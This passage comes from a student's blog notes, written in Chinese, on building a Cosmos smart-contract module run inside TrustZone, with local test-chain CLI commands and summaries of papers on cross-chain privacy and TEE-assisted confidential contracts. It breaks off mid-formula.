fa-external-link-alt\"></i></span></p>\n<p>这不是我一个人的问题……</p>\n<p>2019年就有人想在 SGX 上移植 CosmWasm ，但是苦于 wasmer 不支持\nno_std。</p>\n<p>五年了一直没有进展……</p>\n<p>一眨眼卡在这里十天了。前几天还尝试了别的区块链（Polkadot），结果更复杂了，更不好移植。</p>\n<p>但是 Polkadot 给我了一个思路。Polkadot 和 Cosmos\n类似，都可以模块化的开发。我尝试写了一个 Polkadot\n的模块（叫做pallet），发现模块本质上就是<strong>内嵌在区块链运行时里的一个智能合约</strong>。模块可以存储一些状态，执行一些指令。</p>\n<p>所谓的智能合约模块，就是一个内嵌的模块，这个模块支持上传wasm代码，能够把wasm代码保存在区块链的存储里，并且把wasm代码里的状态也之后的状态也保存在区块链上。</p>\n<p>现在的决定是，重新自己写一个 Cosmos\n模块。智能合约虚拟机的部分，就用C语言搭一个服务器。</p>\n<p>这篇写的很乱，主要是记一下操作给自己看。</p>\n<span id=\"more\"></span>\n<h1 id=\"创建一个最简cosmos\">创建一个最简Cosmos</h1>\n<p>https://tutorials.cosmos.network/hands-on-exercise/0-native/1-preparation.html</p>\n<h1 id=\"备忘\">备忘</h1>\n<p>上传 aot 文件：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">minid tx swt upload \"$(cat ~/WebAssembly/example.b64)\" --gas 2000000 --from alice --yes</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">minid tx swt upload /root/contracts/swt_contracts/contract/target/simple_count.aot --gas 20000000 --from alice --yes</span><br></pre></td></tr></table></figure>\n<p>查询code_id：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">minid query tx &lt;txhash&gt; --output json | jq | grep data</span><br></pre></td></tr></table></figure>\n<p>返回值为 protobuf\n的字节码，可以用解码器解码：https://protobuf-decoder.netlify.app/</p>\n<p>解码得到的数字就是智能合约的 <code>code_id</code> 。</p>\n<p>这样太麻烦了，于是增加了 EventManager，可以直接查看到</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">minid query tx &lt;txhash&gt; --output json | jq | grep code_id -C 2</span><br></pre></td></tr></table></figure>\n<p>查询字节码：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">minid query swt get-bytecode &lt;code_id&gt;</span><br></pre></td></tr></table></figure>\n<p>实例化：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">minid tx swt initialize 1 \"{\\\"count\\\": 1}\" --gas 20000000 --from alice --yes</span><br></pre></td></tr></table></figure>\n<p>启动之前要设置 go\n的环境（在TrustZone中运行的时候不需要设置这个）：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">export</span> GODEBUG=asyncpreemptoff=1 </span><br></pre></td></tr></table></figure>\n<p>wasm 编译：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">/opt/wasi-sdk/bin/clang --target=wasm32-wasi -O3 -nostdlib \\</span><br><span class=\"line\">    -Wl,--no-entry -Wl,--export=&lt;func_name&gt; -o &lt;test.wasm&gt; &lt;test.c&gt;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">wamrc --target=aarch64 --disable-simd -o test.aot test.wasm</span><br></pre></td></tr></table></figure>\n<h1 id=\"总结\">总结</h1>\n<p>启动 qemu：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">export</span> QEMU_VIRTFS_ENABLE=y</span><br><span class=\"line\"><span class=\"built_in\">export</span> QEMU_VIRTFS_HOST_DIR=/root/WebAssembly <span class=\"comment\"># 挂载文件</span></span><br><span class=\"line\"><span class=\"built_in\">export</span> QEMU_VIRTFS_AUTOMOUNT=y</span><br><span class=\"line\"><span class=\"built_in\">export</span> GDBSERVER=y <span class=\"comment\"># 端口转发</span></span><br><span class=\"line\">make run-only</span><br></pre></td></tr></table></figure>\n<p>进入虚拟机：</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">mkdir</span> -p /mnt/host</span><br><span class=\"line\">mount -t 9p -o trans=virtio host /mnt/host</span><br><span class=\"line\"><span class=\"built_in\">cd</span> /mnt/host</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight sh\"><table><tr><td class=\"code\"><pre><span class=\"line\">sh init.sh</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>注意检查 <code>init.sh</code> 包含修改配置：</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"code\"><pre><span class=\"line\">sed -i <span class=\"string\">'s|laddr = \"tcp://127.0.0.1:26657\"|laddr = \"tcp://0.0.0.0:26657\"|'</span> ~/.minid/config/config.toml</span><br></pre></td></tr></table></figure>\n</blockquote>\n<p>启动节点：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">./minid start</span><br></pre></td></tr></table></figure>\n<p>在本地和区块链交互：</p>\n<p>创建一个本地钱包：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">minid keys add mywallet</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">minid keys show mywallet -a</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">minid query bank balances $(minid keys show mywallet -a)</span><br></pre></td></tr></table></figure>\n<p>回到虚拟机，把minid进程挂到后台</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">ctrl + z</span><br><span class=\"line\">bg %1</span><br></pre></td></tr></table></figure>\n<p>让 alice 账户给 mywallet 转账：(先记下本地mywallet的地址)</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">./minid tx bank send alice mini1s09httyypqw7r5r9p6htqkxu0dzsc8f620575d 9000000mini --yes</span><br><span class=\"line\"></span><br><span class=\"line\">./minid tx bank send alice mini1s09httyypqw7r5r9p6htqkxu0dzsc8f620575d 3000000mini --yes</span><br><span class=\"line\">./minid tx bank send alice mini16rnyvqk8cku22lc7xtphntpkk0tnpc4tvj0jhd 3000000mini --yes</span><br></pre></td></tr></table></figure>\n<p>在本地，上传智能合约：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">minid tx swt upload /root/contracts/swt_contracts/contract/target/simple_count.aot --gas 20000000 --from mywallet --yes</span><br></pre></td></tr></table></figure>\n<p>查看上传结果：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">minid query tx &lt;txhash&gt; --output json | jq | grep code_id -C 2</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">minid query swt get-bytecode 1</span><br></pre></td></tr></table></figure>\n<p>实例化智能合约：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">minid tx swt initialize 1 \"{\\\"count\\\": 100}\" --gas 20000000 --from mywallet --yes</span><br></pre></td></tr></table></figure>\n<p>查询智能合约地址：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">minid query tx &lt;tx_hash&gt; | grep contract_address -C 2</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">mini1jvkf9e7agxj8ly7mnxxmaq6cpq5e3hc266nx7p47exgd067xnadqlm3ken</span><br></pre></td></tr></table></figure>\n<p>查询智能合约状态：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">minid query swt contract-state &lt;address&gt; &lt;func_name&gt; &lt;msg&gt;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">minid query swt contract-state mini1jvkf9e7agxj8ly7mnxxmaq6cpq5e3hc266nx7p47exgd067xnadqlm3ken count \"{}\"</span><br></pre></td></tr></table></figure>\n<p>执行事务修改智能合约状态：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">minid tx swt execute &lt;address&gt; &lt;func_name&gt; &lt;msg&gt; --from mywallet --gas 2000000 --yes</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">minid tx swt execute mini1jvkf9e7agxj8ly7mnxxmaq6cpq5e3hc266nx7p47exgd067xnadqlm3ken increase \"{\\\"count\\\": 10}\" --from mywallet --gas 2000000 --yes</span><br></pre></td></tr></table></figure>\n<p>2</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">mini1ulr2skrhrs035mheuhjhp8cg4llqj6afes07urnkvfuwux89vmvsuj6jz7</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">minid query swt contract-state mini1ulr2skrhrs035mheuhjhp8cg4llqj6afes07urnkvfuwux89vmvsuj6jz7 count \"{}\"</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">minid tx swt execute mini1ulr2skrhrs035mheuhjhp8cg4llqj6afes07urnkvfuwux89vmvsuj6jz7 increase \"{\\\"count\\\": 10}\" --from mywallet --gas 2000000 --yes</span><br></pre></td></tr></table></figure>\n<p>3</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">mini12l025hf53wavw4hl8a60ws6wzmcrsry6puclfdu0va37j7unhh8qj358n7</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">minid query swt contract-state mini12l025hf53wavw4hl8a60ws6wzmcrsry6puclfdu0va37j7unhh8qj358n7 count \"{}\"</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">minid tx swt execute mini12l025hf53wavw4hl8a60ws6wzmcrsry6puclfdu0va37j7unhh8qj358n7 increase \"{\\\"count\\\": 10}\" --from mywallet --gas 2000000 --yes</span><br></pre></td></tr></table></figure>\n<p>老师我现在把之前说的系统实现了，在TrustZone里跑通了，和官方的实现方式有一点小区别。上周说的论文还没看，接下来我先看论文想创新点</p>\n<p>有一个小改动：</p>\n<ul>\n<li><p><strong>频繁交互</strong>：fabric和cosmos官方实现的智能合约，都是在智能合约执行过程中频繁发起请求来查询、修改数据</p>\n<p><img src=\"/graduation-project/12/image-20241209191604765.png\" alt=\"image-20241209191604765\" style=\"zoom:50%;\"></p></li>\n<li><p><strong>延迟交互</strong>：我实现的是在执行智能合约之前，一次性把初始状态都传给智能合约；智能合约执行完毕后，一次性把状态全部更新到区块链</p>\n<p><img src=\"/graduation-project/12/image-20241209193130675.png\" alt=\"image-20241209193130675\" style=\"zoom: 50%;\"></p></li>\n<li><p>优点：</p>\n<ul>\n<li>减少智能合约和区块链交互次数，性能更好；</li>\n<li>TEE的封装性更好，攻击面更小；</li>\n</ul></li>\n<li><p>缺点：</p>\n<ul>\n<li>如果需要获取的状态过多，可能需要大量内存空间</li>\n</ul></li>\n</ul>\n<p>冲突问题：</p>\n<ul>\n<li><p>结论：不会发生冲突问题。</p></li>\n<li><p>是否会发生冲突与交互频率无关。</p></li>\n<li><p>在 Cosmos SDK\n的状态机中，事务的执行依赖链上的全局状态。比如：</p>\n<p>当你发送第一笔事务 <code>increase {\"count\": 1}</code>\n时，链的状态会立即更新以反映这笔事务的结果。</p>\n<p>第二笔事务 <code>increase {\"count\": -2}</code>\n在执行前，需要基于第一笔事务完成后的状态进行校验和操作。</p>\n<p>由于 Cosmos SDK\n的事务需要严格依赖状态，因此必须确保事务按顺序执行，且不能并行。</p></li>\n</ul>\n<p>区块链（Cosmos）</p>\n<ul>\n<li><p>由模块组成，模块分为3个部分：</p>\n<ul>\n<li>状态</li>\n<li>tx（修改状态的请求）</li>\n<li>query（查询状态的请求）</li>\n</ul>\n<p>例如，bank模块（用于管理用户资金的模块）</p>\n<ul>\n<li>状态：balance（一个map[address]金额）</li>\n<li>tx：转账、mint等</li>\n<li>query：查询某地址的余额</li>\n</ul></li>\n<li><p>智能合约模块：</p>\n<ul>\n<li><p>状态：</p>\n<ul>\n<li><p>智能合约的Wasm字节码（数组）</p></li>\n<li><p>智能合约的实例</p>\n<p>智能合约要被实例化之后才能被调用，每个智能合约都有自己的区块链账户</p>\n<p>一份字节码可以创建多个智能合约实例</p></li>\n<li><p>智能合约的状态</p>\n<p>每一个智能合约实例，可以维护一些内部状态，例如：</p>\n<p>simple_count智能合约，维护了一个count状态</p></li>\n</ul></li>\n<li><p>tx：</p>\n<ul>\n<li><p>上传字节码</p></li>\n<li><p>实例化智能合约</p></li>\n<li><p>执行智能合约（修改状态）</p>\n<p>提供智能合约实例的 address、要调用的智能合约函数、函数参数（msg）</p>\n<p>执行完智能合约之后，会修改链上状态</p></li>\n</ul></li>\n<li><p>query：</p>\n<ul>\n<li><p>查询智能合约状态</p>\n<p>提供智能合约实例的 address、要调用的智能合约函数、函数参数（msg）</p>\n<p>执行完智能合约之后，不会修改链上状态</p></li>\n</ul></li>\n</ul></li>\n</ul>\n<p>智能合约虚拟机突破了和Tustzone的交互，智能合约制约</p>\n","categories":["笔记"],"tags":["智能合约","毕设","Rust"]},{"title":"毕设13 - 看论文找创新点","url":"/graduation-project/13/","content":"<p>论文需要一个更有创新点的设计，一个没被解决的有隐私问题的场景，或是一个更高效的区块链与TEE交互的方式。</p>\n<p>所以开看论文。</p>\n<span id=\"more\"></span>\n<h1 id=\"区块链互操作性的安全和隐私\">1 区块链互操作性的安全和隐私</h1>\n<p>跨链交换信息的过程中如何保证隐私和安全性。</p>\n<h2 id=\"互操作性概述\">互操作性概述</h2>\n<ul>\n<li><p>资产交换：</p>\n<p>l1：A1持有X，l2：A2持有Y</p>\n<p>l1：A2持有X，l2：A1持有Y</p>\n<p>资产与账本是绑定的，但是可以把其他账户的地址写到任意账本里。</p></li>\n<li><p>资产转移：</p>\n<p>锁定-铸造、销毁-铸造</p></li>\n<li><p>数据传输</p></li>\n</ul>\n<p>互操作性依赖于底层的区块链。如果原区块链发生回滚等操作，就会让某些跨链数据不可信。</p>\n<p>比如：</p>\n<p>L1 锁定了资产 A，同时通过跨链协议让 L2 上铸造了一个资产A，但是之后\nL1把锁定的操作回滚了。此时L2上的资产A就没有支持了。</p>\n<h2 id=\"跨链安全性和隐私模型\">跨链安全性和隐私模型</h2>\n<ul>\n<li><p>网络层</p>\n<p>基础，关心底层区块链安全。</p>\n<p>区块链本身不安全</p></li>\n<li><p>协议层</p>\n<p>关注跨链协议设计，描述跨链操作的规则和机制</p>\n<p>设计的跨链协议有漏洞</p></li>\n<li><p>实现层</p>\n<p>实现跨链协议的实际过程</p>\n<p>实现跨链协议的过程中有漏洞</p></li>\n<li><p>操作层</p>\n<p>跨链系统的部署、升级、运行、监控等过程，如何在实际运行环境中保证安全性</p></li>\n</ul>\n<h2 id=\"安全性方法\">安全性方法</h2>\n<ul>\n<li>可信第三方：由第三方全程管理跨链过程</li>\n<li>分布式信任：不依赖于单一的第三方，而是依赖于一个外部网络</li>\n<li>本地状态验证：链下的参与方仅负责将信息传递到目标链，而跨链交易的有效性是在链上验证的。</li>\n<li>本地验证：本地验证方法依赖最终用户手动验证彼此在各自链上的交易。</li>\n</ul>\n<p>进一步细分：</p>\n<ul>\n<li>中心化：有一个第三方作为信息中继器，链1要向链2转账，先发给中继器，由中继器传递数据</li>\n<li>可信计算：信息中继器不再是一个可信第三方，而是一个TEE，通过证明秘钥证明TEE可信</li>\n<li>无许可网络：不再由单一的第三方（包括中心化和TEE），而是通过该分布式网络来验证</li>\n<li>有许可网络：在无许可网络的基础上，验证者都是可信或有声望的实体。</li>\n<li>包容性证明：要求用户提供可验证的证据，证明某个操作已经在另一个链上触发。依赖于区块链共识机制。</li>\n<li>有效性证明：依赖于零知识证明。挑战在于生成证明的效率。</li>\n<li>欺诈证明：交易数据可以立刻被接受，但是需要有一个外部观察者实时检查这些交易有没有问题，如果发现有问题则提交欺诈证明。即先接受，再证伪。前面都是先证明，再接受。</li>\n<li>哈希锁和时间锁：双方预先约定一个哈希值，规定时间内交易才能被完成。</li>\n</ul>\n<h2 id=\"隐私属性\">隐私属性</h2>\n<ul>\n<li>跨链不可链接性：外部无法推断出链1上的交易t1和链2上的交易t2是有关联的。</li>\n<li>跨链匿名性：发起交易的账户不能与他发起的交易相关联</li>\n<li>跨链交易数据保密性：攻击者不能以超过50%的概率猜测哪一个载荷对应哪个交易。</li>\n</ul>\n<h2 id=\"隐私保护方法\">隐私保护方法</h2>\n<ul>\n<li><p>零知识证明</p></li>\n<li><p>可信执行环境</p></li>\n<li><p><strong>适配签名（Adaptor Signatures）</strong>：</p>\n<p>适配签名是一种能够在不暴露秘密的情况下，验证消息和秘密的签名方案。通过这种方式，双方可以在不公开关键信息的情况下达成协议。尽管在某些情况下可能无法完全保证交易的不可链接性（例如，可以分析交易金额），但仍然能够在没有公开加密货币和汇率的情况下保持一定的隐私性。</p></li>\n<li><p><strong>盲签名（Blind Signatures）</strong>：</p>\n<p>盲签名的主要优势在于它能在不揭露具体内容的情况下对消息进行签名，从而保护用户的隐私。这使得跨链交易能够在保护参与方隐私的同时，保证交易的有效性，并且能防止第三方的监控或定制交易排序。</p></li>\n<li><p><strong>环签名（Ring Signatures）</strong>：</p>\n<p>环签名的特点是能在多个用户之间隐藏发件人的身份。这为跨链交易提供了匿名性，但也带来了一些挑战，特别是在问责制和交易追溯性方面。由于无法确定签名者的身份，这种方式可能会影响交易数据的透明度，尤其是当涉及到重要的身份验证时。</p></li>\n<li><p><strong>同态加密（Homomorphic Encryption）</strong>：</p>\n<p>同态加密技术允许在加密数据上进行计算，而不需要先解密数据。这在某些跨链交易场景中能够保证交易的隐私性。不过，这种技术通常会带来较高的计算成本，因此在实际应用中还需要优化以提高效率。</p></li>\n</ul>\n<h2 id=\"总结\">总结</h2>\n<p>这篇文章聚焦于跨链的安全和隐私，对我目前的研究没直接帮助。但是提供了一些通用的隐私保护方法和安全方法。</p>\n<h1 id=\"tee辅助的机密智能合约\">2 TEE辅助的机密智能合约</h1>\n<p>智能合约存在隐私问题，因为合约的状态和指令代码是公开的。TEE辅助智能合约，可以用于保护合约状态的机密性。</p>\n<p>以投票举例：</p>\n<ul>\n<li>投票者需要参与投票，但是不想暴露自己投票给了谁</li>\n<li>投票者将自己的投票信息加密 <span class=\"math inline\"><mjx-container class=\"MathJax\" jax=\"SVG\"><svg style=\"vertical-align: -0.357ex;\" xmlns=\"http://www.w3.org/2000/svg\" width=\"14.054ex\" height=\"1.927ex\" role=\"img\" focusable=\"false\" viewbox=\"0 -694 6212 851.8\"><g stroke=\"currentColor\" fill=\"currentColor\" stroke-width=\"0\" transform=\"scale(1,-1)\"><g data-mml-node=\"math\"><g data-mml-node=\"mi\"><path data-c=\"1D463\" d=\"M173 380Q173 405 154 405Q130 405 104 376T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Q21 294 29 316T53 368T97 419T160 441Q202 441 225 417T249 361Q249 344 246 335Q246 329 231 291T200 202T182 113Q182 86 187 69Q200 26 250 26Q287 26 319 60T369 139T398 222T409 277Q409 300 401 317T383 343T365 361T357 383Q357 405 376 424T417 443Q436 443 451 425T467 367Q467 340 455 284T418 159T347 40T241 -11Q177 -11 139 22Q102 54 102 117Q102 148 110 181T151 298Q173 362 173 380Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(485,0)\"><path data-c=\"1D45C\" d=\"M201 -11Q126 -11 80 38T34 156Q34 221 64 279T146 380Q222 441 301 441Q333 441 341 440Q354 437 367 433T402 417T438 387T464 338T476 268Q476 161 390 75T201 -11ZM121 120Q121 70 147 48T206 26Q250 26 289 58T351 142Q360 163 374 216T388 308Q388 352 370 375Q346 405 306 405Q243 405 195 347Q158 303 140 230T121 120Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(970,0)\"><path data-c=\"1D461\" d=\"M26 385Q19 392 19 395Q19 399 22 411T27 425Q29 430 36 430T87 431H140L159 511Q162 522 166 540T173 566T179 586T187 603T197 615T211 624T229 626Q247 625 254 615T261 596Q261 589 252 549T232 470L222 433Q222 431 272 431H323Q330 424 330 420Q330 398 317 385H210L174 240Q135 80 135 68Q135 26 162 26Q197 26 230 60T283 144Q285 150 288 151T303 153H307Q322 153 322 145Q322 142 319 133Q314 117 301 95T267 48T216 6T155 -11Q125 -11 98 4T59 56Q57 64 57 83V101L92 241Q127 382 128 383Q128 385 77 385H26Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(1331,0)\"><path data-c=\"1D452\" d=\"M39 168Q39 225 58 272T107 350T174 402T244 433T307 442H310Q355 442 388 420T421 355Q421 265 310 237Q261 224 176 223Q139 223 138 221Q138 219 132 186T125 128Q125 81 146 54T209 26T302 45T394 111Q403 121 406 121Q410 121 419 112T429 98T420 82T390 55T344 24T281 -1T205 -11Q126 -11 83 42T39 168ZM373 353Q367 405 305 405Q272 405 244 391T199 357T170 316T154 280T149 261Q149 260 169 260Q282 260 327 284T373 353Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(1797,0)\"><path data-c=\"1D451\" d=\"M366 683Q367 683 438 688T511 694Q523 694 523 686Q523 679 450 384T375 83T374 68Q374 26 402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487H491Q506 153 506 145Q506 140 503 129Q490 79 473 48T445 8T417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157Q33 205 53 255T101 341Q148 398 195 420T280 442Q336 442 364 400Q369 394 369 396Q370 400 396 505T424 616Q424 629 417 632T378 637H357Q351 643 351 645T353 664Q358 683 366 683ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(2317,0)\"><path data-c=\"1D44E\" d=\"M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(2846,0)\"><path data-c=\"1D461\" d=\"M26 385Q19 392 19 395Q19 399 22 411T27 425Q29 430 36 430T87 431H140L159 511Q162 522 166 540T173 566T179 586T187 603T197 615T211 624T229 626Q247 625 254 615T261 596Q261 589 252 549T232 470L222 433Q222 431 272 431H323Q330 424 330 420Q330 398 317 385H210L174 240Q135 80 135 68Q135 26 162 26Q197 26 230 60T283 144Q285 150 288 151T303 153H307Q322 153 322 145Q322 142 319 133Q314 117 301 95T267 48T216 6T155 -11Q125 -11 98 4T59 56Q57 64 57 83V101L92 241Q127 382 128 383Q128 385 77 385H26Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(3207,0)\"><path data-c=\"1D44E\" d=\"M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(4013.8,0)\"><path data-c=\"2192\" d=\"M56 237T56 250T70 270H835Q719 357 692 493Q692 494 692 496T691 499Q691 511 708 511H711Q720 511 723 510T729 506T732 497T735 481T743 456Q765 389 816 336T935 261Q944 258 944 250Q944 244 939 241T915 231T877 212Q836 186 806 152T761 85T740 35T732 4Q730 -6 727 -8T711 -11Q691 -11 691 0Q691 7 696 25Q728 151 835 230H70Q56 237 56 250Z\"/></g><g data-mml-node=\"msub\" transform=\"translate(5291.6,0)\"><g data-mml-node=\"mi\"><path data-c=\"1D450\" d=\"M34 159Q34 268 120 355T306 442Q362 442 394 418T427 355Q427 326 408 306T360 285Q341 285 330 295T319 325T330 359T352 380T366 386H367Q367 388 361 392T340 400T306 404Q276 404 249 390Q228 381 206 359Q162 315 142 235T121 119Q121 73 147 50Q169 26 205 26H209Q321 26 394 111Q403 121 406 121Q410 121 419 112T429 98T420 83T391 55T346 25T282 0T202 -11Q127 -11 81 37T34 159Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(466,-150) scale(0.707)\"><path data-c=\"1D462\" d=\"M21 287Q21 295 30 318T55 370T99 420T158 442Q204 442 227 417T250 358Q250 340 216 246T182 105Q182 62 196 45T238 27T291 44T328 78L339 95Q341 99 377 247Q407 367 413 387T427 416Q444 431 463 431Q480 431 488 421T496 402L420 84Q419 79 419 68Q419 43 426 35T447 26Q469 29 482 57T512 145Q514 153 532 153Q551 153 551 144Q550 139 549 130T540 98T523 55T498 17T462 -8Q454 -10 438 -10Q372 -10 347 46Q345 45 336 36T318 21T296 6T267 -6T233 -11Q189 -11 155 7Q103 38 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z\"/></g></g></g></g></svg></mjx-container></span> ，把加密后的信息添加到事务 <span class=\"math inline\"><mjx-container class=\"MathJax\" jax=\"SVG\"><svg style=\"vertical-align: -0.357ex;\" xmlns=\"http://www.w3.org/2000/svg\" width=\"8.026ex\" height=\"1.889ex\" role=\"img\" focusable=\"false\" viewbox=\"0 -677 3547.5 834.8\"><g stroke=\"currentColor\" fill=\"currentColor\" stroke-width=\"0\" transform=\"scale(1,-1)\"><g data-mml-node=\"math\"><g data-mml-node=\"msub\"><g data-mml-node=\"mi\"><path data-c=\"1D450\" d=\"M34 159Q34 268 120 355T306 442Q362 442 394 418T427 355Q427 326 408 306T360 285Q341 285 330 295T319 325T330 359T352 380T366 386H367Q367 388 361 392T340 400T306 404Q276 404 249 390Q228 381 206 359Q162 315 142 235T121 119Q121 73 147 50Q169 26 205 26H209Q321 26 394 111Q403 121 406 121Q410 121 419 112T429 98T420 83T391 55T346 25T282 0T202 -11Q127 -11 81 37T34 159Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(466,-150) scale(0.707)\"><path data-c=\"1D462\" d=\"M21 287Q21 295 30 318T55 370T99 420T158 442Q204 442 227 417T250 358Q250 340 216 246T182 105Q182 62 196 45T238 27T291 44T328 78L339 95Q341 99 377 247Q407 367 413 387T427 416Q444 431 463 431Q480 431 488 421T496 402L420 84Q419 79 419 68Q419 43 426 35T447 26Q469 29 482 57T512 145Q514 153 532 153Q551 153 551 144Q550 139 549 130T540 98T523 55T498 17T462 -8Q454 -10 438 -10Q372 -10 347 46Q345 45 336 36T318 21T296 6T267 -6T233 -11Q189 -11 155 7Q103 38 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z\"/></g></g><g data-mml-node=\"mo\" transform=\"translate(1198.2,0)\"><path data-c=\"2192\" d=\"M56 237T56 250T70 270H835Q719 357 692 493Q692 494 692 496T691 499Q691 511 708 511H711Q720 511 723 510T729 506T732 497T735 481T743 456Q765 389 816 336T935 261Q944 258 944 250Q944 244 939 241T915 231T877 212Q836 186 806 152T761 85T740 35T732 4Q730 -6 727 -8T711 -11Q691 -11 691 0Q691 7 696 25Q728 151 835 230H70Q56 237 56 250Z\"/></g><g data-mml-node=\"msub\" transform=\"translate(2476,0)\"><g data-mml-node=\"mi\"><path data-c=\"1D447\" d=\"M40 437Q21 437 21 445Q21 450 37 501T71 602L88 651Q93 669 101 677H569H659Q691 677 697 676T704 667Q704 661 687 553T668 444Q668 437 649 437Q640 437 637 437T631 442L629 445Q629 451 635 490T641 551Q641 586 628 604T573 629Q568 630 515 631Q469 631 457 630T439 622Q438 621 368 343T298 60Q298 48 386 46Q418 46 427 45T436 36Q436 31 433 22Q429 4 424 1L422 0Q419 0 415 0Q410 0 363 1T228 2Q99 2 64 0H49Q43 6 43 9T45 27Q49 40 55 46H83H94Q174 46 189 55Q190 56 191 56Q196 59 201 76T241 233Q258 301 269 344Q339 619 339 625Q339 630 310 630H279Q212 630 191 624Q146 614 121 583T67 467Q60 445 57 441T43 437H40Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(617,-150) scale(0.707)\"><path data-c=\"1D465\" d=\"M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 